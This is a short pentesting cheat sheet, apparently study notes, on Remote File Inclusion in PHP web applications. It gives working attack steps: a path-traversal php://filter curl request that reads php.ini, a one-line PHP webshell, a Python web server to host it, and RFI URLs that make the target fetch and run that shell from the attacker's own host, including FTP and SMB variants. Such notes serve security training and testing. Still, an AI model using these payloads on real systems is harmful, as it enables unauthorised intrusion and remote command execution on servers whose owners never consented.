# Remote File Inclusion (RFI)

## **Introduction**

> * RFI is basically an LFI which also allows **inclusion of remote URLs** in order to **include remote files**
> * The objectives are to **enumerate local ports and web application through SSRF vulnerabilities** or Gaining RCE by \*\*including a malicious script that we host on our server \*\*
> * Almost any RFI vulnerability is also an LFI vulnerability (by including a local URL rather than a remote URL)

***

## **Enumerate RFI Vulnerabilities**

1. Check if `allow_url_include` is enabled:
   * To do so, you need to read the PHP configuration file found at
   * (`/etc/php/X.Y/apache2/php.ini`) for Apache
   * (`/etc/php/X.Y/fpm/php.ini`) for Nginx,
   * where `X.Y` is your install PHP version
2. Read the PHP Configuration File using the base64 filter (to ensure everything is read properly)
   * `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`
3. Check if the option is set to ON: `echo 'BASE64VALUE' | base64 -d | grep allow_url_include`
4. This may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with.
5. Try to include a URL, starting with a local url like `http://127.0.0.1:80/index.php` then, if that works, include a remote URL

***

## **Remote Code Execution from RFI**

Follow these steps:

1. Write the webshell payload file: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
2. Start a webserver: `sudo python3 -m http.server <LISTENING_PORT>`
3. Use RFI to gain RCE: `http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
4. The same thing can be done by starting a local `FTP` or `SMB` server and using `ftp://<OUR_IP>/shell.php&cmd=id` or `\\<OUR_IP>\share\shell.php`
